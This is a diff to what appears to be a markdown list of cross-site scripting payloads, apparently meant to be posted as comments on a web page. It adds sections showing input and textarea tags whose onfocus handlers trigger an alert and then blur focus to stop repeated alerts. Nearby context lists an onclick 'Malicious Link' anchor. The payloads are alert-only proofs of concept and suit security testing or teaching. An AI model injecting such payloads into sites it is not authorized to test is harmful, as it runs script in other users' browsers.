@@ -58,6 +58,13 @@ Explanation: This payload uses an <input> tag with an onfocus event handler. Whe
 
 Note : After execution of this comment, if you receive alert message continously just reload the page.
 
+#### Preventing Continuous Alerts:
+
+You can change the focus to another element after showing the alert:
+```HTML
+<input type="text" value="TEXT" onfocus="alert(\'YOU CAN NOT OVERWRITE\'); this.blur();">
+```
+
 ### 8. Malicious URL:
 ```HTML
 <a href="https://fruits.selfmade.solutions" onclick="alert(\'Are you sure?\')">Malicious Link</a>
@@ -71,6 +78,13 @@ Explanation: This payload uses an <a> (anchor) tag with an onclick event handler
 Explanation: This payload uses a <textarea> tag with an onfocus event handler. When the user focuses on the textarea (e.g., clicks on it), the browser executes the JavaScript code, causing an alert with the message "YOU CAN NOT OVERWRITE".
 
 Note : After execution of this comment, if you receive alert message continously just reload the page.
+
+#### Preventing Continuous Alerts:
+
+You can change the focus to another element after showing the alert:
+```HTML
+<textarea onfocus="alert(\'YOU CAN NOT OVERWRITE\'); this.blur();">Focus on me</textarea>
+```
 
 ### 10. Iframe Tag:
 ```HTML
